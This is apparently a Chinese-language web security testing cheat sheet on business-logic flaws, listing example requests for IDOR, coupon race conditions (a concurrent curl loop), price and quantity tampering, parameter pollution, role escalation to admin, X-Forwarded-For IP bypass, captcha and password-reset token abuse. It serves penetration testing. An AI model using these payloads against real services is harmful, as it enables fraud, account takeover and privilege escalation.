# 业务逻辑漏洞补充

## 1. 越权访问 (IDOR)

### 水平越权

```
# 访问其他用户数据
GET /api/users/1 -> GET /api/users/2
GET /api/orders?user_id=1 -> user_id=2
```

### 垂直越权

```
# 普通用户访问管理员功能
GET /api/admin/users
POST /api/admin/settings
```

---

## 2. 竞态条件

### 优惠券多次使用

```
# 使用优惠券
POST /api/coupon/use

# 快速发送多个请求
for i in {1..10}; do curl -X POST http://target/api/coupon/use -d '{"code":"SAVE20"}' & done
```

### 积分重复领取

### 余额重复扣款

---

## 3. 价格篡改

### 修改金额

```
POST /api/checkout
{"price": 100} -> {"price": 1}
{"amount": 100} -> {"amount": 0.01}
```

### 负数利用

```
{"price": -100}
{"quantity": -1}
```

---

## 4. 参数污染

### HTTP参数污染

```
# 重复参数
POST /api/transfer?to=user1&to=user2&amount=100

# 数组参数
POST /api/users?id[]=1&id[]=2
```

### JSON参数污染

```
{"id": 1, "id": 2}
{"role": "user", "role": "admin"}
```

---

## 5. 权限绕过

### IP限制绕过

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### 时间戳绕过

```
timestamp=old_timestamp
```

### 流程绕过

```
# 跳过必要步骤
POST /api/step3 (直接到step3，跳过step1,2)
```

---

## 6. 批量操作

### 批量删除

```
POST /api/users/batch-delete
{"ids": [1,2,3,4,5]}
```

### 批量权限提升

```
POST /api/roles/assign
{"users": ["user1", "user2"], "role": "admin"}
```

---

## 7. 验证码绕过

### 验证码不失效

```
# 获取验证码后不删除
# 同一验证码可重复使用
```

### 验证码可预测

```
# 4位数字: 0000-9999
# 6位数字: 000000-999999
```

### 验证码删除

```
# 删除验证码参数
# 或设置为空
```

---

## 8. 密码重置

### Token不绑定

```
# 使用A用户的token重置B用户密码
POST /api/reset-password
{"token": "A用户的token", "new_password": "xxx", "user": "B用户名"}
```

### Token可预测

```
# 简单递增
/reset/12345 -> /reset/12346
# 时间戳
/reset/1700000000 -> 稍后 /reset/1700000100
```

---

## 9. 批量注册

```
# 同一IP/邮箱注册多个账号
# 利用邀请码无限注册
```

---

## 10. 越权访问总结

| 漏洞类型 | 描述 | 测试方法 |
|----------|------|------------|
| IDOR | 对象级访问控制缺失 | 修改ID参数 |
| 水平越权 | 同权限用户间访问 | 修改其他用户ID |
| 垂直越权 | 低权限访问高权限 | 修改角色参数 |
| 参数污染 | 重复参数覆盖 | 参数重复 |
| 流程绕过 | 跳过验证步骤 | 直接访问最终接口 |
